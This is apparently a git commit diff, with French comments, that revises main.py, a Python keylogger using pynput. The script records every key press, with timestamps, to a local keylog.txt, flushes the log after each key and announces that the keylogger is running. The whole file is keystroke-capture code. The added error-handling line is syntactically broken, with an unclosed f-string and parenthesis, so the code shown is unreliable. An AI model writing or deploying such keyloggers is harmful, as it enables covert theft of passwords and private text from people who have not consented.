259417e662eb999d9b82c0e396751b8b91dc7ba8
Benjamin <ben@pop-os.home>
2026-02-14 23:34:22 +0100

    [ADD] modification du script pour plus de lisibilité

--- main.py
+++ main.py
@@ -1,10 +1,29 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 import logging
- 
-logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
- 
+import os
+
+# Chemin absolu pour être sûr de savoir où le fichier est créé
+log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
+
+logging.basicConfig(
+    filename=log_path,
+    level=logging.DEBUG,
+    format="%(asctime)s - %(message)s"
+)
+
+logger = logging.getLogger()
+for handler in logger.handlers:
+    handler.flush()
+
 def on_press(key):
-    logging.info(str(key))
- 
+    try:
+        logging.info(str(key))
+
+        for handler in logging.getLogger().handlers:
+            handler.flush()
+    except Exception as e:
+        print(f"Erreur : {e}
+
 with Listener(on_press=on_press) as listener:
+    print(f"Keylogger lancé. Fichier : {log_path}")
     listener.join()
